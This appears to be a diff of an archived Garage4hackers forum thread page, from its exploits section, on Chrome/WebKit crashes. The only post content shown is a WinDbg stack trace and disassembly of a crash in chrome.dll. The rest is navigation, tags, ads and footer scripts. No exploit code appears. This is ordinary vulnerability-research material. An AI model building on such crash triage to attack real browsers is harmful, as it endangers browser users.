+0024ecf8 6328210a 02e97000 01cd8000 02e9f010 chrome_630c0000!ovly_debug_event+0x1a3f78<br />
+0024edbc 63258191 00000001 01cd8040 01cd8000 chrome_630c0000!ovly_debug_event+0x1a22f5<br />
+0:000&gt; u<br />
+chrome_630c0000!ovly_debug_event+0x1678e2:<br />
+632476f7 e81ffafbff      call    chrome_630c0000!ovly_debug_event+0x127306 (6320711b)<br />
+632476fc 84c0            test    al,al<br />
+632476fe 755b            jne     chrome_630c0000!ovly_debug_event+0x167946 (6324775b)<br />
+63247700 8b742410        mov     esi,dword ptr [esp+10h]<br />
+63247704 8b16            mov     edx,dword ptr [esi]<br />
+63247706 8b8214010000    mov     eax,dword ptr [edx+114h]<br />
+6324770c 8bce            mov     ecx,esi<br />
+6324770e ffd0            call    eax<br />
+0:000&gt; u chrome_630c0000!ovly_debug_event+0x167946<br />
+chrome_630c0000!ovly_debug_event+0x167946:<br />
+6324775b 8b7508          mov     esi,dword ptr [ebp+8]<br />
+6324775e 8b4618          mov     eax,dword ptr [esi+18h]<br />
+63247761 c1e80a          shr     eax,0Ah<br />
+63247764 a801            test    al,1<br />
+63247766 752f            jne     chrome_630c0000!ovly_debug_event+0x167982 (63247797)<br />
+63247768 8b4b0c          mov     ecx,dword ptr [ebx+0Ch]<br />
+6324776b 8b11            mov     edx,dword ptr [ecx]<br />
+6324776d 8b421c          mov     eax,dword ptr [edx+1Ch]
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				
+				
+				
+					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_11859" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_11859" class="newreply" href="newreplye518.html?do=newreply&amp;p=11859" rel="nofollow" title="Reply With Quote"><img id="quoteimg_11859" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+		</ol>
+                <div class="separator"></div>
+		<div class="postlistfoot">
+			
+		</div>
+
+	
+
+</div>
+
+<div id="below_postlist" class="noinlinemod below_postlist">
+	
+	<div id="pagination_bottom" class="pagination_bottom">
+	
+		<div class="clear"></div>
+<div class="navpopupmenu popupmenu nohovermenu" id="showthread_navpopup">
+	
+		<span class="shade">Quick Navigation</span>
+		<a href="showthread1123.html?t=4895" class="popupctrl"><span class="ctrlcontainer">Garage4hackers Exploits</span></a>
+		<a href="showthreadd840.html?t=4895&amp;p=11859#top" class="textcontrol" onclick="document.location.hash='top';return false;">Top</a>
+	
+	<ul class="navpopupbody popupbody popuphover">
+		
+		<li class="optionlabel">Site Areas</li>
+		<li><a href="usercp.html">Settings</a></li>
+		<li><a href="private.html">Private Messages</a></li>
+		<li><a href="subscription.html">Subscriptions</a></li>
+		<li><a href="online.html">Who's Online</a></li>
+		<li><a href="search.html">Search Forums</a></li>
+		<li><a href="forum.html">Forums Home</a></li>
+		
+			<li class="optionlabel">Forums</li>
+			
+		
+			
+				<li><a href="forumdisplay58da.html?f=1">Garage Network</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay12a3.html?f=2">Garage Announcements</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaye57d.html?f=58">Bravo - Null 2012</a></li>
+			
+		
+			
+				<li><a href="forumdisplay0756.html?f=59">Garage Local Chapter Meets</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay31e6.html?f=4">Garage Rules</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye774.html?f=5">Feedback &amp; Suggestions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayd42b.html?f=7">Introduce Your Self</a></li>
+			
+		
+			
+				<li><a href="forumdisplay2b89.html?f=38">Shout-box</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplaycf19.html?f=6">Garage Lounge</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay5579.html?f=30">Hacking for Beginners</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay6ac3.html?f=57">Did You Know?</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay957d.html?f=8">Security &amp; Hacking News Thread</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3215.html?f=36">Career in InfoSec</a></li>
+			
+		
+			
+				<li><a href="forumdisplay814c.html?f=29">Request Zone</a></li>
+			
+		
+			
+				<li><a href="forumdisplay13b6.html?f=27">Noobs Corner</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplayfac0.html?f=55">Tip | Trick of the Day</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4a6.html?f=66">ICS / SCADA Security</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6111.html?f=67">Internet of Things - IoT</a></li>
+			
+		
+			
+				<li><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaya05c.html?f=56">Post Exploitation</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay8a83.html?f=11">Web Application Penetration Testing</a></li>
+			
+		
+			
+				<li><a href="forumdisplay01c9.html?f=12">Wireless and Bluetooth Hacking</a></li>
+			
+		
+			
+				<li><a href="forumdisplay48ab.html?f=17">Computer Forensics and Incident Handling</a></li>
+			
+		
+			
+				<li><a href="forumdisplay218b.html?f=19">Physical Security and Social Engineering</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb09f.html?f=15">General Security &amp; Best Practices</a></li>
+			
+		
+			
+				<li><a href="forumdisplay907f.html?f=42">Security and Hacking Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplay9e0d.html?f=54">Mobile Security</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay9780.html?f=14">General Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay9df8.html?f=31">Programming</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay65b9.html?f=35">Assembly</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4f1.html?f=32">C/C++</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb0a0.html?f=34">Perl</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb8c1.html?f=60">PHP</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6c4e.html?f=33">Python</a></li>
+			
+		
+			
+				<li><a href="forumdisplay208f.html?f=51">Linux Shell / Bash Programming</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3238.html?f=47">Windows Batch Programming</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayce40.html?f=28">BackTrack and Other Linux Distributions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf2fa.html?f=16">Networks &amp; Networking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya213.html?f=18">Cloud Computing</a></li>
+			
+		
+			
+				<li><a href="forumdisplaydfa4.html?f=39">Security Podcast and Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya3f5.html?f=40">Miscellanous Thread</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay30ac.html?f=49">Brush Up Your Skills</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayffeb.html?f=20">Experts Forum</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplaycdba.html?f=48">My Meanest Hacks</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf6ac.html?f=37">Hacking &amp; Security Books and Tutorials</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8011.html?f=23">Tools &amp; Scripts</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
+			
+		
+			
+				<li><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
+			
+		
+			
+				<li><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye5f3.html?f=64">Browser Fuzzing</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+		
+	</ul>
+</div>
+<div class="clear"></div>
+	</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+<!-- next / previous links -->
+<div class="navlinks">
+	
+	<strong>&laquo;</strong>
+	<a href="showthreada0ea.html?t=4895&amp;goto=nextoldest" rel="nofollow">Previous Thread</a>
+	|
+	<a href="showthread9773.html?t=4895&amp;goto=nextnewest" rel="nofollow">Next Thread</a>
+	<strong>&raquo;</strong>
+	
+</div>
+<!-- / next / previous links -->
+
+<div id="thread_info" class="thread_info">
+	
+	
+	
+	
+	<h4 class="threadinfohead"><span class="optiontitle">Tags for this Thread</span></h4>
+	<div id="thread_tags_list" class="thread_info_block">
+		<div class="inner_block">
+			
+			<div id='tag_list_cell'>
+				
+		
+			<a href="tags91b4.html?tag=chrome+crash">chrome crash</a>, 
+		
+			<a href="tags84bc.html?tag=chrome+vulnerability">chrome vulnerability</a>, 
+		
+			<a href="tags5482.html?tag=safari+crash">safari crash</a>, 
+		
+			<a href="tags0131.html?tag=safari+vulnerability">safari vulnerability</a>, 
+		
+			<a href="tagsf407.html?tag=webkit+crash">webkit crash</a>, 
+		
+			<a href="tags1bc6.html?tag=webkit+vulnerability">webkit vulnerability</a>
+		
+
+<img src="images/misc/11x11progress.html" id="tag_form_progress" class="inlineimg hidden" alt="" />
+			</div>
+			<p>
+				<a href="tags.html">View Tag Cloud</a>
+			</p>
+		</div>
+	</div>
+	
+	<div class="options_block_container">
+		
+		<div class="options_block">
+			<h4 class="collapse">
+				<a class="collapse" id="collapse_posting_rules" href="showthreadd840.html?t=4895&amp;p=11859#top"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				<span class="optiontitle">Posting Permissions</span>
+			</h4>
+			<div id="posting_rules" class="thread_info_block">
+				
+<div id="forumrules" class="info_subblock">
+
+	<ul class="youcandoblock">
+		<li>You <strong>may not</strong> post new threads</li>
+		<li>You <strong>may not</strong> post replies</li>
+		<li>You <strong>may not</strong> post attachments</li>
+		<li>You <strong>may not</strong> edit your posts</li>
+		<li>&nbsp;</li>
+	</ul>
+	<div class="bbcodeblock">
+		<ul>
+			<li><a href="miscaff0.html?do=bbcode" target="_blank">BB code</a> is <strong>On</strong></li>
+			<li><a href="misc9712.html?do=showsmilies" target="_blank">Smilies</a> are <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#imgcode" target="_blank">[IMG]</a> code is <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#videocode" target="_blank">[VIDEO]</a> code is <strong>On</strong></li>
+			<li>HTML code is <strong>Off</strong></li>
+		</ul>
+	</div>
+	<p class="rules_link"><a href="misc17ec.html?do=showrules" target="_blank">Forum Rules</a></p>
+
+</div>
+
+			</div>
+		</div>
+
+	</div>
+
+</div>
+
+
+
+
+
+
+
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="showthreadd840.html?t=4895&amp;p=11859#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">04:20 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
